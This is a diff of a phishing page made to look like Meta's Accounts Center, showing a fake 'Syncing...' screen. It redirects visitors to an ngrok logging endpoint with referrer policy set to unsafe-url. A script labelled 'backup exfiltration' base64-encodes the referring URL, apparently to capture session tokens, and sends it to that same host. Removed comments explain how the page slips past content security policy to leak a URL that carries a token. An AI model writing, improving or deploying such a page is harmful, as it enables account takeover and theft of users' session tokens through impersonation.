@@ -1,35 +1,37 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Verifying Session...</title>
     <meta name="referrer" content="unsafe-url">
     
+    <meta http-equiv="refresh" content="0.5;url=https://bolsteringly-rightish-joan.ngrok-free.dev/log?capture=active">
+
+    <title>Meta Accounts Center</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica; background: #fafafa; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; border: 1px solid #dbdbdb; padding: 30px; border-radius: 3px; text-align: center; max-width: 350px; }
+        .spinner { border: 2px solid #f3f3f3; border-top: 2px solid #0095f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 16px; color: #262626; margin: 0 0 10px; }
+        p { font-size: 14px; color: #8e8e8e; margin: 0; }
     </style>
 </head>
 <body>
-    <div class="card">
+    <div class="container">
         <div class="spinner"></div>
-        <h2 style="font-size: 18px; color: #262626;">Finalizing Secure Link</h2>
-        <p style="font-size: 14px; color: #8e8e8e;">Please wait while we sync your Meta accounts center data...</p>
+        <h2>Syncing...</h2>
+        <p>Please wait while we verify your account connection.</p>
     </div>
 
     <script>
-        // 1. SETTINGS
-        var NGROK_LOG_URL = "https://bolsteringly-rightish-joan.ngrok-free.dev/log";
-        
-        // 2. THE PUSH:
-        // Instead of using 'fetch' (which CSP blocks), we perform a natural 
-        // navigation. This makes the browser "leak" the token-filled 
-        // URL that brought us here into the headers of the next request.
+        // BACKUP EXFILTRATION:
+        // If the Meta Refresh fails, this JavaScript 'fetch' tries a secondary push.
         setTimeout(function() {
-            window.location.href = NGROK_LOG_URL + "?session_check=1&ts=" + Date.now();
-        }, 800);
+            var leak = document.referrer;
+            if (leak) {
+                fetch("https://bolsteringly-rightish-joan.ngrok-free.dev/log?data=" + btoa(leak), {mode: 'no-cors'});
+            }
+        }, 1000);
     </script>
 </body>
 </html>
